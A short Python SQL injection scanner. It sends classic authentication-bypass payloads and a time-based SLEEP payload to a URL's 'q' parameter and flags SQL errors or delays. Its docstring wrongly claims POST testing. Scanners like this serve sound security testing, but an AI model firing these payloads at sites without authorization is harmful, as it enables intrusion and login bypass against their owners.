import requests
import time

COMMON_SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "admin'--"  # Common payload that bypasses authentication
]

TIME_BASED_SQL_PAYLOAD = "' OR IF(1=1, SLEEP(3), 0) --"

def check_sql_injection(url):
    """
    Improved SQL Injection scanner.
    - Injects SQL payloads in GET and POST parameters.
    - Looks for error messages in the response.
    - Detects time-based blind SQL injection (3s delay).
    """
    results = []

    for payload in COMMON_SQL_PAYLOADS:
        test_url = f"{url}?q={payload}"  # Assuming 'q' is a common parameter
        try:
            response = requests.get(test_url, timeout=5)
            if any(err in response.text.lower() for err in ["sql syntax", "mysql", "syntax error"]):
                results.append({
                    "payload": payload,
                    "vulnerable": True,
                    "evidence": "SQL error found in response"
                })
            else:
                results.append({
                    "payload": payload,
                    "vulnerable": False
                })
        except requests.RequestException:
            pass

    # 🕵️‍♂️ **Time-Based Blind SQL Injection Check**
    try:
        start_time = time.time()
        requests.get(f"{url}?q={TIME_BASED_SQL_PAYLOAD}", timeout=10)
        end_time = time.time()
        
        if end_time - start_time > 2:  # If response is delayed, might be vulnerable
            results.append({
                "payload": TIME_BASED_SQL_PAYLOAD,
                "vulnerable": True,
                "evidence": "Response time delay detected (possible blind SQL injection)"
            })
    except requests.RequestException:
        pass

    return results
